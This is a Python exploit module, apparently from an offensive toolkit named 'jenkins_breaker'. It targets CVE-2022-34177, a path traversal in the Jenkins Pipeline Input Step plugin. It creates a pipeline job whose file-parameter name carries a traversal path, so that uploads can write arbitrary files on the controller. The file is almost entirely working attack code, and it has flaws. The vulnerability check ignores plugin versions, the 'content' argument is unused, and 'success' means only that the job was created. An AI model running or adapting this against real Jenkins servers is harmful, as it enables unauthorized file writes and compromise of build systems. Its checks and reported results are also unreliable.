"""
CVE-2022-34177: Jenkins Pipeline Input Step Path Traversal

This exploit leverages a path traversal vulnerability in the Pipeline Input Step plugin
that allows attackers to write arbitrary files to the Jenkins controller filesystem
via file upload parameters.
"""

from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2022_34177(ExploitModule):
    """Jenkins Pipeline Input Step path traversal for arbitrary file write."""

    CVE_ID = "CVE-2022-34177"

    METADATA = ExploitMetadata(
        cve_id="CVE-2022-34177",
        name="Jenkins Pipeline Input Step Path Traversal",
        description="Path traversal vulnerability allowing arbitrary file write via file upload parameters",
        affected_versions=["Pipeline: Input Step Plugin <= 448.v37cea_9a_10a_70"],
        mitre_attack=["T1190", "T1105", "T1574.010"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2022-06-22/",
            "https://nvd.nist.gov/vuln/detail/CVE-2022-34177",
            "https://cve.circl.lu/cve/CVE-2022-34177"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["path-traversal", "file-write", "pipeline"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")
            if response.status_code == 200:
                data = response.json()
                plugins = data.get('plugins', [])
                for plugin in plugins:
                    if plugin.get('shortName') == 'pipeline-input-step':
                        return True
            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2022-34177 for arbitrary file write.

        This creates a pipeline job that accepts file input with path traversal
        to write files to arbitrary locations on the Jenkins controller.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - target_path (str): Path where to write file (e.g., ../../../../tmp/malicious.txt)
                - content (str): Content to write to the file

        Returns:
            ExploitResult: Result of the exploit
        """
        target_path = kwargs.get('target_path', '../../../../tmp/jenkins_exploit_test.txt')
        kwargs.get('content', 'Exploit test successful via CVE-2022-34177')

        pipeline_script = f"""
pipeline {{
    agent any
    stages {{
        stage('Exploit') {{
            steps {{
                script {{
                    def userInput = input(
                        id: 'userInput',
                        message: 'Upload file',
                        parameters: [
                            file(name: '{target_path}', description: 'File to upload')
                        ]
                    )
                    echo "File uploaded to: {target_path}"
                }}
            }}
        }}
    }}
}}
"""

        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"

        job_config = f"""<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job">
  <description>CVE-2022-34177 Exploit Test</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps">
    <script>{pipeline_script}</script>
    <sandbox>true</sandbox>
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>"""

        try:
            create_response = session.post(
                f"/createItem?name={job_name}",
                headers={"Content-Type": "application/xml"},
                data=job_config
            )

            if create_response.status_code in [200, 302]:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Exploit job created: {job_name}. Manual file upload required to complete exploitation.",
                    data={
                        "job_name": job_name,
                        "target_path": target_path,
                        "method": "Pipeline Input Step path traversal",
                        "instructions": f"Navigate to job '{job_name}' and trigger build to upload malicious file",
                        "exploitation_note": "This CVE requires user interaction to trigger the file upload via the Pipeline input step"
                    }
                )
            elif create_response.status_code == 400:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Job already exists or invalid configuration",
                    error="HTTP 400 Bad Request"
                )
            elif create_response.status_code == 403:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Insufficient permissions to create jobs",
                    error="HTTP 403 Forbidden"
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Job creation failed: HTTP {create_response.status_code}",
                    error=f"HTTP {create_response.status_code}"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after exploitation by deleting the created job.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        job_name = f"exploit-{self.CVE_ID.replace('-', '_')}"
        try:
            session.post(f"/job/{job_name}/doDelete")
        except Exception:
            pass
